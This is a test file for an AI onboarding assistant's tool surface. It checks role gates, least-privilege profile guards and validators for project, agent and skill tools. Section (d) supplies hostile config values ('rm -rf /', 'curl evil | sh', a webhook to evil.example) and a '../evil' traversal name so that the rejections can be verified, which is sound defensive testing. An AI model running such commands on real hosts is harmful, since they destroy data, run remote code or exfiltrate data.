import "./_guard.mjs"; // prod-guard: arms the Db backstop (sets LOOM_TEST=1; see _guard.mjs)
// Setup Assistant E1-3 — the ungated, user-facing onboarding assistant's CURATED, FAIL-CLOSED surface
// (mcp/setup.ts). DETERMINISTIC + CLAUDE-FREE + NETWORK-FREE, hermetic like audit-surface.mjs: a REAL Db
// + SessionService driven against a FAKE pty (PtyHost createPty() seam), the REAL routers driven over an
// in-process MCP InMemoryTransport (no HTTP, no external daemon). A real temp git repo backs project
// creation; the only thing faked is the claude pty.
//
// Proves the DoD:
//   (a) THE LOAD-BEARING SECURITY GOAL — a "setup" session gets the loom-setup surface, and the Platform,
//       Orchestration AND Audit routers' resolveRole() — the exact predicate each handle() 404s on —
//       return NULL for it. So a setup session can NEVER reach /mcp-platform, /mcp-orch, /mcp-audit.
//       Symmetrically, the setup router returns NULL for every NON-setup role (manager/worker/plain/
//       platform/auditor) — an agent/non-setup session can never reach /mcp-setup. buildMcpServers(setup)
//       mounts loom-setup ONLY (+loom-tasks), never platform/orch/audit, with a ["mcp__loom-setup"] allow.
//   (b) the surface is EXACTLY the curated subset of 22 (incl. project_init, project_archive, agent_update,
//       the agent_get/profile_get/project_get reads, template_list/template_apply, and the self-scoped
//       end_me terminal exit) — and NONE of the elevated/outward/self-improvement tools (no git/vault/
//       message/stop/schedule/escalate/audit).
//   (l) template_list/template_apply (onboarding C2) — template_list reads the canonical workflow-template
//       catalog (name + description + agent roster summary), read-only. template_apply stands up a named
//       template's agents + starter board cards on an EXISTING project (reusing agent_create + task-insert
//       only); an unknown templateName, an unknown projectId (the project-scope guard), and an unknown
//       profileName are all rejected with nothing written.
//   (c) the curated tools work end-to-end: project_create (real git repo), project_configure,
//       project_update, project_archive (soft + reserved-guarded), agent_create,
//       profile_create/update/assign, list_all_*, session_spawn(manager|plain).
//   (j) project_init BOOTSTRAPS a brand-new project (no-repo onboarding): it creates a dir STRICTLY under
//       the sanctioned WORKSPACE_ROOT and `git init`s it (kind:"git") or leaves a plain folder (kind:"vault");
//       a traversal/absolute dirName is REJECTED and writes nothing outside the base; it won't clobber.
//   (k) project_create is VAULT-ONLY capable: omit repoPath + give an existing non-git vaultPath → a
//       research/notes project; omitting both, or a non-existent vaultPath, is rejected (fail-closed).
//   (g) agent_update EDITS an existing agent (amend startupPrompt / rename / (re)assign-or-clear profile),
//       404s an unknown id, and LEAST-PRIVILEGE rejects assigning an elevated-role (platform/auditor/
//       workspace-auditor) rig — the gap that collapsed "action these cards for me" into "paste this text."
//   (g2) agent_update / profile_assign resolve an agentId id-PREFIX like agent_get does (the read/write
//       asymmetry that yielded a silent "agent not found" on a prefix agent_get itself resolved fine):
//       an unambiguous 8-char prefix resolves, a full id still works, and an ambiguous prefix is REJECTED
//       naming the candidate ids — never resolved to an arbitrary match.
//   (h) the single-record reads (agent_get/profile_get/project_get) return FULL records (so the operator
//       stops reading via empty-payload mutators), not-found on an unknown id.
//   (i) a kanbanColumns config — the board-rename the operator wrongly called "not implemented" — is
//       ACCEPTED by the setup AGENT validator, and an invalid config's rejection lists the valid keys.
//   (d) THE VALIDATOR REJECTIONS — project_create/configure/update REJECT orchestration.gateCommand
//       (host-RCE) and alertWebhook (exfil) by construction (agent validator); session_spawn REFUSES
//       platform/auditor/worker/setup (no self-elevation) and creates nothing.
//   (f) SKILLS — skill_list reads the user's store; skill_write is confirm-first (rejects without
//       confirm:true) and BOUNDED to the USER store (rejects any bundled skill name + path traversal,
//       leaving the shipped asset byte-unchanged), with a write→list round-trip + in-place update.
//
// Run: 1) build (turbo builds shared first), 2) node test/setup-surface.mjs
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execSync } from "node:child_process";

let failures = 0;
const check = (label, cond) => { console.log(`${cond ? "PASS" : "FAIL"}  ${label}`); if (!cond) failures++; };

// --- Hermetic LOOM_HOME + a sandboxed HOME. Set BEFORE importing dist (paths.ts reads LOOM_HOME at import). ---
const tmpHome = path.join(os.tmpdir(), `loom-setup-${Date.now()}-${process.pid}`);
fs.mkdirSync(path.join(tmpHome, "logs"), { recursive: true });
process.env.LOOM_HOME = tmpHome;
const sandboxHome = path.join(tmpHome, "home");
fs.mkdirSync(sandboxHome, { recursive: true });
process.env.USERPROFILE = sandboxHome; // Windows: os.homedir() reads USERPROFILE
process.env.HOME = sandboxHome;        // POSIX: os.homedir() reads HOME

// --- Hermetic bundled-asset set for the skill_write USER-store bound (store.ts reads LOOM_ASSET_SKILLS at
// load; SKILLS_DIR is LOOM_HOME/skills). A controlled asset dir with ONE bundled skill ("core-doctrine")
// so the bound test is deterministic and never depends on / mutates the real repo asset set. ---
const assetSkillsDir = path.join(tmpHome, "asset-skills");
fs.mkdirSync(path.join(assetSkillsDir, "core-doctrine"), { recursive: true });
const BUNDLED_MD = "---\nname: core-doctrine\ndescription: a shipped Loom skill\n---\n\n# core-doctrine\n\nBundled body — must never be touched by skill_write.\n";
fs.writeFileSync(path.join(assetSkillsDir, "core-doctrine", "SKILL.md"), BUNDLED_MD);
process.env.LOOM_ASSET_SKILLS = assetSkillsDir; // BEFORE importing dist — store.ts computes ASSET_SKILLS at load
const storeSkillMd = (name) => path.join(tmpHome, "skills", name, "SKILL.md");

import { requireHermeticEnv } from "./_guard.mjs";
requireHermeticEnv(); // confirm LOOM_HOME is the temp dir (no port — this test runs no HTTP daemon)

const { Db } = await import("../dist/db.js");
const { seedDefaultProfiles } = await import("../dist/profiles/seed.js");
const { PtyHost, buildMcpServers } = await import("../dist/pty/host.js");
const { SessionService } = await import("../dist/sessions/service.js");
const { OrchestrationControl } = await import("../dist/orchestration/control.js");
const { SetupMcpRouter } = await import("../dist/mcp/setup.js");
const { PlatformMcpRouter } = await import("../dist/mcp/platform.js");
const { OrchestrationMcpRouter } = await import("../dist/mcp/orchestration.js");
const { AuditMcpRouter } = await import("../dist/mcp/audit.js");
const { resolveConfig } = await import("@loom/shared");
const { WORKSPACE_ROOT } = await import("../dist/paths.js");
const { isGitRepo: isGitRepoReal } = await import("../dist/git/reader.js");
const { Client } = await import("@modelcontextprotocol/sdk/client/index.js");
const { InMemoryTransport } = await import("@modelcontextprotocol/sdk/inMemory.js");

// --- a real temp git repo so project_create has a valid repoPath (createPty is faked → no real claude) ---
const repo = path.join(os.tmpdir(), `loom-setup-repo-${Date.now()}`);
fs.mkdirSync(repo, { recursive: true });
fs.writeFileSync(path.join(repo, "README.md"), "# setup test repo\n");
execSync(`git init -q && git add . && git -c user.email=s@loom -c user.name=s commit -q -m init`, { cwd: repo });
const nonGit = path.join(os.tmpdir(), `loom-setup-nongit-${Date.now()}`);
fs.mkdirSync(nonGit, { recursive: true });

const now = new Date().toISOString();
const db = new Db();
// Seed the CORE bundled profiles (Orchestrator/Dev/Bugfix/QA Tester/Web Designer/Code Reviewer) — LOOM_DEV
// is unset above, so no elevated Platform-layer profiles seed. template_apply ((l) below) binds a
// canonical template's agents to these EXISTING bundled profiles by name.
seedDefaultProfiles(db);
// The reserved "Getting Started" home (E1-6 seeds this; here we just need a project to host the agents).
db.insertProject({ id: "pHome", name: "Getting Started", repoPath: repo, vaultPath: repo, config: {}, createdAt: now, archivedAt: null, reserved: true });
db.insertAgent({ id: "agentSetup", projectId: "pHome", name: "Setup Assistant", startupPrompt: "SETUP", position: 0, profileId: null });
db.insertAgent({ id: "agentMgr", projectId: "pHome", name: "Mgr", startupPrompt: "MGR", position: 1, profileId: null });

// Role-gate fixtures: one session per role.
const seedSession = (id, role) => db.insertSession({
  id, projectId: "pHome", agentId: "agentSetup", engineSessionId: null,
  title: null, cwd: repo, processState: "live", resumability: "unknown", busy: false,
  createdAt: now, lastActivity: now, lastError: null, role, parentSessionId: null,
});
seedSession("SETUP", "setup"); // the setup session under test (the loom-setup caller)
seedSession("M", "manager");
seedSession("W", "worker");
seedSession("P", null);   // plain
seedSession("PL", "platform");
seedSession("AUD", "auditor");

// Fake pty: capture createPty (spawn) calls; no real claude (mirrors audit-surface.mjs).
class SeamHost extends PtyHost {
  constructor(events) { super(events); this.spawned = []; }
  createPty(opts) { this.spawned.push(opts); return { pid: 4242, write() {}, onData() { return { dispose() {} }; }, onExit() { return { dispose() {} }; }, kill() {}, resize() {} }; }
  stop() {}
}
const events = {
  onEngineSessionId(id, eng) { db.setEngineSessionId(id, eng); },
  onBusy(id, busy) { db.setBusy(id, busy); },
  onContextStats() {}, onRateLimited() {},
  onExit(id) { db.setProcessState(id, "exited"); db.setBusy(id, false); },
};
const host = new SeamHost(events);
const svc = new SessionService(db, host, new OrchestrationControl());
const setupRouter = new SetupMcpRouter(db, svc);
const platformRouter = new PlatformMcpRouter(db, svc);
const orchRouter = new OrchestrationMcpRouter(db, svc);
const auditRouter = new AuditMcpRouter(db, svc);

const parse = (res) => JSON.parse(res.content[0].text);

try {
  // ============ (a) THE LOAD-BEARING SECURITY GOAL — role gates ============
  check("(a) setup router: setup session SETUP HAS the loom-setup surface (resolveRole truthy)", !!setupRouter.resolveRole("SETUP"));
  // Symmetric gate: every NON-setup role gets NULL from the setup router — an agent/non-setup session
  // can never reach /mcp-setup (resolveRole is the exact 404 predicate handle() uses).
  for (const id of ["M", "W", "P", "PL", "AUD"]) {
    check(`(a) setup router: non-setup session ${id} gets NO setup surface`, setupRouter.resolveRole(id) === null);
  }
  // THE PROOF: a setup session can NEVER reach the Lead's /mcp-platform, the manager/worker /mcp-orch,
  // NOR the auditor's /mcp-audit — each router's resolveRole is the exact 404 predicate.
  check("(a) PLATFORM router resolveRole(SETUP) === null → setup 404s on /mcp-platform", platformRouter.resolveRole("SETUP") === null);
  check("(a) ORCH router resolveRole(SETUP) === null → setup 404s on /mcp-orch", orchRouter.resolveRole("SETUP") === null);
  check("(a) AUDIT router resolveRole(SETUP) === null → setup 404s on /mcp-audit", auditRouter.resolveRole("SETUP") === null);
  // The surface map a setup session is spawned with: loom-setup ONLY (+ loom-tasks). No platform/orch/audit.
  const setupMcpMap = buildMcpServers({ sessionId: "SETUP", port: 4317, role: "setup" });
  check("(a) buildMcpServers(setup): mounts loom-setup", !!setupMcpMap["loom-setup"]);
  check("(a) buildMcpServers(setup): still has loom-tasks", !!setupMcpMap["loom-tasks"]);
  check("(a) buildMcpServers(setup): does NOT mount loom-platform", !setupMcpMap["loom-platform"]);
  check("(a) buildMcpServers(setup): does NOT mount loom-orchestration", !setupMcpMap["loom-orchestration"]);
  check("(a) buildMcpServers(setup): does NOT mount loom-audit", !setupMcpMap["loom-audit"]);

  // ============ (b) THE CURATED SURFACE — exactly the subset, none of the elevated tools ============
  const server = setupRouter.buildServer("SETUP");
  const [clientT, serverT] = InMemoryTransport.createLinkedPair();
  await server.connect(serverT);
  const client = new Client({ name: "setup-e1-3-test", version: "0" });
  await client.connect(clientT);
  const call = async (name, args) => parse(await client.callTool({ name, arguments: args }));

  const tools = (await client.listTools()).tools.map((t) => t.name).sort();
  const expected = [
    "agent_create", "agent_get", "agent_update", "end_me", "list_all_agents", "list_all_projects", "list_all_sessions",
    "profile_assign", "profile_create", "profile_get", "profile_update",
    "project_archive", "project_configure", "project_create", "project_get", "project_init", "project_update", "session_spawn",
    "skill_list", "skill_write", "template_apply", "template_list",
  ];
  check(`(b) setup surface is EXACTLY the curated subset of 22 (got ${tools.length}: ${tools.join(",")})`,
    JSON.stringify(tools) === JSON.stringify(expected));
  // The still-ABSENT trust boundary — project_archive is now INCLUDED (the ONE v1 widen), but the
  // outward/host/elevated/self-improvement set must stay unreachable.
  const forbidden = [
    "git_checkout", "git_create_branch", "git_commit", "git_push", "vault_write",
    "session_message", "session_stop", "schedule_create", "schedule_update",
    "platform_escalate", "audit_file_finding", "preset_suggestion_suggest", "worker_spawn", "daemon_restart",
  ];
  check("(b) setup surface has NONE of the elevated/outward/self-improvement tools",
    forbidden.every((t) => !tools.includes(t)));

  // ============ (c) the curated tools work end-to-end ============
  // project_create with a REAL git repo → created; vaultPath omitted → defaults to repoPath.
  const created = await call("project_create", { name: "MyProj", repoPath: repo });
  check("(c) project_create: returns a project with an id", !!created.id && !created.error);
  check("(c) project_create: vaultPath defaults to repoPath", created.vaultPath === repo);
  check("(c) project_create: persisted (db.getProject)", !!db.getProject(created.id) && db.getProject(created.id).reserved === false);
  // Guardrail: a non-git dir is rejected, nothing created.
  const nBefore = db.listAllProjects().length;
  const badRepo = await call("project_create", { name: "Bad", repoPath: nonGit });
  check("(c) project_create: a non-git repoPath is rejected", typeof badRepo.error === "string" && !badRepo.id);
  check("(c) project_create: the rejected create made NO project", db.listAllProjects().length === nBefore);

  // project_create with a CODE repo + a DISTINCT vaultPath that does NOT exist on disk yet → the vault
  // root is SCAFFOLDED at create time, so the project's vault is writable immediately with no manual
  // mkdir (the bug this fixes: an uncreated vaultPath used to misdirect vault_write into a misleading
  // 'traversal' error on its first write).
  const freshVault = path.join(os.tmpdir(), `loom-setup-fresh-vault-${Date.now()}`);
  check("(c) fresh vaultPath does not exist yet", !fs.existsSync(freshVault));
  const createdFreshVault = await call("project_create", { name: "FreshVaultProj", repoPath: repo, vaultPath: freshVault });
  check("(c) project_create: a distinct non-existent vaultPath is ACCEPTED (not rejected like the vault-only case below)",
    !!createdFreshVault.id && !createdFreshVault.error);
  check("(c) project_create: SCAFFOLDS the vaultPath directory on disk",
    fs.existsSync(freshVault) && fs.statSync(freshVault).isDirectory());

  // project_configure with a valid override (AGENT validator) → applied; resolveConfig reflects it.
  const cfg = { kanbanColumns: [{ key: "a", label: "A", role: "defaultLanding" }, { key: "b", label: "B", role: "terminal" }] };
  const configured = await call("project_configure", { projectId: created.id, config: cfg });
  check("(c) project_configure: accepted (no error)", configured.ok === true && !configured.error);
  check("(c) project_configure: resolveConfig reflects the override",
    resolveConfig(db.getProject(created.id).config).kanbanColumns.length === 2);

  // project_update: name + vaultPath + config (all via the AGENT validator).
  const updated = await call("project_update", { projectId: created.id, name: "Renamed", vaultPath: repo, config: { docLint: true } });
  check("(c) project_update: name applied", updated.name === "Renamed" && !updated.error);
  check("(c) project_update: config applied (docLint)", resolveConfig(db.getProject(created.id).config).docLint === true);

  // agent_create under the new project.
  const agent = await call("agent_create", { projectId: created.id, name: "Worker", startupPrompt: "go" });
  check("(c) agent_create: returns an agent with an id", !!agent.id && !agent.error);
  check("(c) agent_create: persisted under the project + is NOT an endpoint", db.getAgent(agent.id)?.projectId === created.id && db.getAgent(agent.id)?.endpoint === false);
  const badAgentProfile = await call("agent_create", { projectId: created.id, name: "X", profileId: "nope" });
  check("(c) agent_create: a non-existent profileId is rejected", typeof badAgentProfile.error === "string" && !badAgentProfile.id);

  // profile_create / update / assign — the strict validateProfile is reused.
  const prof = await call("profile_create", { profile: { name: "Dev Rig", role: "worker", icon: "🛠️" } });
  check("(c) profile_create: returns a profile with an id", !!prof.id && prof.role === "worker" && !prof.error);
  const badProf = await call("profile_create", { profile: { name: "Bad", role: "auditor" } });
  check("(c) profile_create: an unmintable role (auditor) is rejected", typeof badProf.error === "string" && !badProf.id);
  const updProf = await call("profile_update", { profileId: prof.id, patch: { icon: "⚙️" } });
  check("(c) profile_update: partial patch applied", updProf.icon === "⚙️" && updProf.name === "Dev Rig" && !updProf.error);
  const assigned = await call("profile_assign", { agentId: agent.id, profileId: prof.id });
  check("(c) profile_assign: the profile is bound to the agent", assigned.profileId === prof.id && !assigned.error);
  const badAssign = await call("profile_assign", { agentId: "nope", profileId: prof.id });
  check("(c) profile_assign: an unknown agent is rejected", typeof badAssign.error === "string");

  // ============ (e) LEAST-PRIVILEGE: the ungated setup surface may NOT mint/edit an elevated-role rig ============
  // profile_create accepts manager|worker|setup|null, but REJECTS the elevated "platform"/"auditor" roles
  // (a default human spawn could otherwise silently elevate an agent carrying such a rig). The narrow
  // guard runs ON TOP of validateProfile (which is NOT loosened — it still allows "platform" for the
  // human REST + Platform Lead surfaces). nProfBefore proves a rejected create persists nothing.
  const nProfBefore = db.listProfiles().length;
  const platProf = await call("profile_create", { profile: { name: "PlatRig", role: "platform" } });
  check("(e) profile_create REJECTS role 'platform' (elevated, human-only)", typeof platProf.error === "string" && !platProf.id);
  const audProf = await call("profile_create", { profile: { name: "AuditRig", role: "auditor" } });
  check("(e) profile_create REJECTS role 'auditor' (elevated, human-only)", typeof audProf.error === "string" && !audProf.id);
  check("(e) the rejected profile_create(s) persisted NOTHING", db.listProfiles().length === nProfBefore);
  // The allowed roles all succeed (manager|worker|setup|null) — the assistant's core job is unbroken.
  const okMgr = await call("profile_create", { profile: { name: "MgrRig", role: "manager" } });
  const okWrk = await call("profile_create", { profile: { name: "WrkRig", role: "worker" } });
  const okSet = await call("profile_create", { profile: { name: "SetRig", role: "setup" } });
  const okNul = await call("profile_create", { profile: { name: "NulRig" } }); // role omitted ⇒ null
  check("(e) profile_create ACCEPTS role 'manager'", okMgr.role === "manager" && !okMgr.error);
  check("(e) profile_create ACCEPTS role 'worker'", okWrk.role === "worker" && !okWrk.error);
  check("(e) profile_create ACCEPTS role 'setup'", okSet.role === "setup" && !okSet.error);
  check("(e) profile_create ACCEPTS a role-null rig", okNul.role === null && !okNul.error);
  // profile_update must not be able to ELEVATE an existing rig to platform/auditor via the patch.
  const upElev = await call("profile_update", { profileId: okWrk.id, patch: { role: "platform" } });
  check("(e) profile_update REJECTS a patch that elevates role to 'platform'", typeof upElev.error === "string");
  check("(e) profile_update: the rejected elevate left the stored role UNCHANGED (still worker)", db.getProfile(okWrk.id)?.role === "worker");
  const upElevA = await call("profile_update", { profileId: okWrk.id, patch: { role: "auditor" } });
  check("(e) profile_update REJECTS a patch that elevates role to 'auditor'", typeof upElevA.error === "string" && db.getProfile(okWrk.id)?.role === "worker");
  // A non-role patch on the same rig still works (the guard only blocks the elevated role).
  const upOk = await call("profile_update", { profileId: okWrk.id, patch: { icon: "🔧" } });
  check("(e) profile_update still applies a non-role patch (icon)", upOk.icon === "🔧" && upOk.role === "worker" && !upOk.error);

  // reads.
  const projs = await call("list_all_projects", {});
  check("(c) list_all_projects: includes the created project", projs.some((p) => p.id === created.id));
  const agents = await call("list_all_agents", { projectId: created.id });
  check("(c) list_all_agents: narrows to the project", agents.length > 0 && agents.every((a) => a.projectId === created.id));
  const sess = await call("list_all_sessions", {});
  check("(c) list_all_sessions: returns the live session summaries", Array.isArray(sess) && sess.some((s) => s.id === "SETUP"));

  // 8-char id-PREFIX resolution for list_all_sessions (card 7097f3fb) — mirrors project_get: a full id OR
  // an unambiguous 8-char prefix resolves the SAME rows; unknown is an EXPLICIT error, never a silent [].
  db.insertProject({ id: "cafe1234-full-uuid-form", name: "Prefixed", repoPath: repo, vaultPath: repo, config: {}, createdAt: new Date().toISOString(), archivedAt: null, reserved: false });
  db.insertAgent({ id: "agentPfx", projectId: "cafe1234-full-uuid-form", name: "Pfx", startupPrompt: "PFX", position: 0, profileId: null });
  db.insertSession({
    id: "SPFX", projectId: "cafe1234-full-uuid-form", agentId: "agentPfx", engineSessionId: null, title: null, cwd: repo,
    processState: "live", resumability: "unknown", busy: false, createdAt: new Date().toISOString(), lastActivity: new Date().toISOString(), lastError: null,
    role: null, parentSessionId: null,
  });
  const byPrefixSess = await call("list_all_sessions", { projectId: "cafe1234" });
  check("(c) list_all_sessions (8-char prefix): resolves to the full-id project's rows", byPrefixSess.some((s) => s.id === "SPFX"));
  const unknownPfxSess = await call("list_all_sessions", { projectId: "ffffffff" });
  check("(c) list_all_sessions (unknown prefix): explicit error, never a silent []",
    !Array.isArray(unknownPfxSess) && unknownPfxSess.error === "project not found");

  // 8-char id-PREFIX resolution for list_all_agents (sibling of list_all_sessions's card 7097f3fb /
  // f10093f) — reuses the "cafe1234" fixture above: a full id OR an unambiguous 8-char prefix resolves
  // the SAME rows; unknown is an EXPLICIT error, never a silent [].
  const fullIdAgents = await call("list_all_agents", { projectId: "cafe1234-full-uuid-form" });
  const byPrefixAgents = await call("list_all_agents", { projectId: "cafe1234" });
  check("(c) list_all_agents (8-char prefix): returns the SAME rows as the full id",
    byPrefixAgents.some((a) => a.id === "agentPfx") && byPrefixAgents.length === fullIdAgents.length);
  const unknownPfxAgents = await call("list_all_agents", { projectId: "ffffffff" });
  check("(c) list_all_agents (unknown prefix): explicit error, never a silent []",
    !Array.isArray(unknownPfxAgents) && unknownPfxAgents.error === "project not found");

  // project_archive (the ONE v1 widen) — soft, reversible, reserved-guarded.
  // A NON-reserved project archives (hidden from the active list; row retained).
  const toArchive = await call("project_create", { name: "Disposable", repoPath: repo });
  check("(c) project_archive: precondition — a fresh non-reserved project exists & is active",
    !!toArchive.id && db.listAllProjects().some((p) => p.id === toArchive.id));
  const archived = await call("project_archive", { projectId: toArchive.id });
  check("(c) project_archive: a non-reserved project archives (archived:true)", archived.archived === true && !archived.error);
  check("(c) project_archive: the project is now hidden from the active list", !db.listAllProjects().some((p) => p.id === toArchive.id));
  check("(c) project_archive: the row is retained (soft, reversible)", !!db.getProject(toArchive.id)?.archivedAt);
  // REFUSED on a reserved/system home (the operator can never archive its own "Getting Started" home).
  const archiveReserved = await call("project_archive", { projectId: "pHome" });
  check("(c) project_archive: REFUSES a reserved/system home", typeof archiveReserved.error === "string" && !archiveReserved.archived);
  check("(c) project_archive: the reserved home is left active (not archived)", db.getProject("pHome")?.archivedAt == null);
  // 404 on an unknown id.
  const archiveUnknown = await call("project_archive", { projectId: "nope" });
  check("(c) project_archive: unknown id 404s", typeof archiveUnknown.error === "string" && !archiveUnknown.archived);

  // session_spawn(manager|plain) → drives the (fake) pty.
  const nSpawnBefore = db.listAllSessions().length;
  const mgr = await call("session_spawn", { projectId: created.id, agentId: agent.id, role: "manager" });
  check("(c) session_spawn(manager): returns a live session", !!mgr.id && mgr.role === "manager" && !mgr.error);
  const plain = await call("session_spawn", { projectId: created.id, agentId: agent.id, role: "plain" });
  check("(c) session_spawn(plain): returns a role-null session", !!plain.id && plain.role == null && !plain.error);
  check("(c) session_spawn: drove the (fake) pty for both", host.spawned.some((o) => o.sessionId === mgr.id) && host.spawned.some((o) => o.sessionId === plain.id));
  check("(c) session_spawn: created exactly two sessions", db.listAllSessions().length === nSpawnBefore + 2);

  // ============ (d) THE VALIDATOR REJECTIONS — host-RCE / exfil keys are rejected by construction ============
  // project_create REJECTS gateCommand + alertWebhook (agent validator).
  const nRce = db.listAllProjects().length;
  const createGate = await call("project_create", { name: "Rce", repoPath: repo, config: { orchestration: { gateCommand: "rm -rf /" } } });
  check("(d) project_create REJECTS orchestration.gateCommand (host-RCE)", typeof createGate.error === "string" && !createGate.id);
  const createHook = await call("project_create", { name: "Exfil", repoPath: repo, config: { orchestration: { alertWebhook: { url: "https://evil.example", events: ["x"] } } } });
  check("(d) project_create REJECTS orchestration.alertWebhook (exfil)", typeof createHook.error === "string" && !createHook.id);
  check("(d) the rejected create(s) made NO project", db.listAllProjects().length === nRce);
  // project_configure REJECTS them too, and leaves the stored config unchanged.
  const cfgBefore = JSON.stringify(db.getProject(created.id).config);
  const configGate = await call("project_configure", { projectId: created.id, config: { orchestration: { gateCommand: "curl evil | sh" } } });
  check("(d) project_configure REJECTS orchestration.gateCommand", typeof configGate.error === "string" && !configGate.ok);
  const configHook = await call("project_configure", { projectId: created.id, config: { orchestration: { alertWebhook: { url: "https://evil.example", events: ["x"] } } } });
  check("(d) project_configure REJECTS orchestration.alertWebhook", typeof configHook.error === "string" && !configHook.ok);
  check("(d) the rejected configure(s) did NOT change the stored config", JSON.stringify(db.getProject(created.id).config) === cfgBefore);
  // project_update REJECTS them too.
  const updateGate = await call("project_update", { projectId: created.id, config: { orchestration: { gateCommand: "pwn" } } });
  check("(d) project_update REJECTS orchestration.gateCommand", typeof updateGate.error === "string");
  check("(d) the rejected update did NOT change the stored config", JSON.stringify(db.getProject(created.id).config) === cfgBefore);

  // session_spawn REFUSES every privileged/manager-owned role (no self-elevation).
  const nRefuse = db.listAllSessions().length;
  for (const role of ["platform", "auditor", "worker", "setup", "run", "bogus"]) {
    const r = await call("session_spawn", { projectId: created.id, agentId: agent.id, role });
    check(`(d) session_spawn REFUSES role "${role}"`, typeof r.error === "string" && !r.id);
  }
  check("(d) the refused spawns created NO session", db.listAllSessions().length === nRefuse);

  // ============ (f) SKILLS — skill_list (read) + skill_write (USER store ONLY, confirm-first) ============
  // The store (LOOM_HOME/skills) starts empty; the only bundled skill is the fixture "core-doctrine".
  const skills0 = await call("skill_list", {});
  check("(f) skill_list: returns a skills array (store starts empty)", Array.isArray(skills0.skills) && skills0.skills.length === 0);

  // CONFIRM-FIRST: a write WITHOUT confirm:true is rejected and writes NOTHING.
  const noConfirm = await call("skill_write", { name: "my-skill", content: "x" });
  check("(f) skill_write: rejected without confirm:true", typeof noConfirm.error === "string" && /confirm/i.test(noConfirm.error) && !noConfirm.ok);
  const confirmFalse = await call("skill_write", { name: "my-skill", content: "x", confirm: false });
  check("(f) skill_write: rejected with confirm:false", typeof confirmFalse.error === "string" && !confirmFalse.ok);
  check("(f) skill_write: the unconfirmed writes created NO store file", !fs.existsSync(storeSkillMd("my-skill")));

  // ROUND-TRIP: a confirmed write to a USER name succeeds and skill_list reflects it (with content + editable).
  const MY_MD = "---\nname: my-skill\ndescription: my onboarding helper\n---\n\n# my-skill\n\nDo the user's thing.\n";
  const wrote = await call("skill_write", { name: "my-skill", content: MY_MD, confirm: true });
  check("(f) skill_write: a confirmed USER-store write succeeds", wrote.ok === true && wrote.name === "my-skill" && wrote.bundled === false && !wrote.error);
  check("(f) skill_write: the store SKILL.md was written", fs.existsSync(storeSkillMd("my-skill")) && fs.readFileSync(storeSkillMd("my-skill"), "utf8") === MY_MD);
  const skills1 = await call("skill_list", {});
  const mine = skills1.skills.find((s) => s.name === "my-skill");
  check("(f) skill_list: reflects the new user skill (editable, with content + description)",
    !!mine && mine.editable === true && mine.bundled === false && mine.content === MY_MD && mine.description === "my onboarding helper");

  // UPDATE in place (same name) → content replaced.
  const MY_MD2 = MY_MD.replace("Do the user's thing.", "Do the user's UPDATED thing.");
  const wrote2 = await call("skill_write", { name: "my-skill", content: MY_MD2, confirm: true });
  check("(f) skill_write: an update to the same user skill succeeds", wrote2.ok === true && !wrote2.error);
  check("(f) skill_write: the update replaced the store content", fs.readFileSync(storeSkillMd("my-skill"), "utf8") === MY_MD2);

  // THE BOUND (load-bearing): skill_write CANNOT touch a bundled/dev skill — even confirmed.
  const bundledBefore = fs.readFileSync(path.join(assetSkillsDir, "core-doctrine", "SKILL.md"), "utf8");
  const hackBundled = await call("skill_write", { name: "core-doctrine", content: "HACKED", confirm: true });
  check("(f) skill_write: REJECTS a bundled skill name (bound to USER store)", typeof hackBundled.error === "string" && /bundled/i.test(hackBundled.error) && !hackBundled.ok);
  check("(f) skill_write: the rejected bundled write created NO divergent store copy", !fs.existsSync(storeSkillMd("core-doctrine")));
  check("(f) skill_write: the shipped bundled ASSET is byte-unchanged",
    fs.readFileSync(path.join(assetSkillsDir, "core-doctrine", "SKILL.md"), "utf8") === bundledBefore && bundledBefore === BUNDLED_MD);
  // Path-traversal: an invalid name (slug guard) is rejected, even confirmed.
  const traversal = await call("skill_write", { name: "../evil", content: "x", confirm: true });
  check("(f) skill_write: REJECTS a path-traversal / invalid name", typeof traversal.error === "string" && !traversal.ok);

  // ============ (g) agent_update — the card's core: action workspace cards by EDITING an agent ============
  // The operator can now amend an EXISTING agent's startupPrompt (the gap that collapsed "action these
  // cards for me" into "paste this text"). `agent` was created in (c) under the new project.
  const editPrompt = await call("agent_update", { agentId: agent.id, startupPrompt: "AMENDED prompt v2" });
  check("(g) agent_update: amends an agent's startupPrompt", editPrompt.startupPrompt === "AMENDED prompt v2" && !editPrompt.error);
  check("(g) agent_update: the edit is persisted (next session picks it up)", db.getAgent(agent.id)?.startupPrompt === "AMENDED prompt v2");
  // PATCH semantics: a name-only edit leaves the (just-amended) startupPrompt as-is.
  const editName = await call("agent_update", { agentId: agent.id, name: "Renamed Worker" });
  check("(g) agent_update: PATCH — a name-only edit leaves startupPrompt as-is",
    editName.name === "Renamed Worker" && editName.startupPrompt === "AMENDED prompt v2" && !editName.error);
  // 404 on an unknown agent id (nothing mutated).
  const editUnknown = await call("agent_update", { agentId: "nope", startupPrompt: "x" });
  check("(g) agent_update: 404s an unknown agent id", typeof editUnknown.error === "string" && /not found/i.test(editUnknown.error));
  // (Re)assign an ALLOWED-role profile (worker rig `prof` from (c)) — succeeds.
  const editAssign = await call("agent_update", { agentId: agent.id, profileId: prof.id });
  check("(g) agent_update: assigns an allowed-role (worker) profile", editAssign.profileId === prof.id && !editAssign.error);
  // profileId:null CLEARS the assignment (falls back to the plain backstop).
  const editClear = await call("agent_update", { agentId: agent.id, profileId: null });
  check("(g) agent_update: profileId:null CLEARS the assignment", editClear.profileId === null && !editClear.error);

  // LEAST-PRIVILEGE: the setup operator can NEVER bind an agent to an elevated-role rig. The setup surface
  // can't MINT one (proved in (e)), so seed an elevated profile directly via Db, then prove agent_update
  // REJECTS assigning it — and leaves the agent's assignment unchanged.
  db.insertProfile({ id: "elevatedRig", name: "Platform Rig", role: "platform", description: "elevated rig", allowDelta: [], skills: null, model: null, icon: "🛡️" });
  const assignBefore = db.getAgent(agent.id)?.profileId ?? null;
  const editElev = await call("agent_update", { agentId: agent.id, profileId: "elevatedRig" });
  check("(g) agent_update REJECTS assigning an elevated-role (platform) profile", typeof editElev.error === "string" && /platform|elevat|cannot/i.test(editElev.error));
  check("(g) agent_update: the rejected elevate left the agent's assignment UNCHANGED", (db.getAgent(agent.id)?.profileId ?? null) === assignBefore);

  // The SIBLING profile_assign must enforce the SAME bound (it previously skipped the guard — the latent
  // elevation back door). Reuse the "elevatedRig" platform profile: profile_assign of it is REJECTED and
  // leaves the agent's assignment unchanged; the allowed-role (worker) profile_assign success path holds in (c).
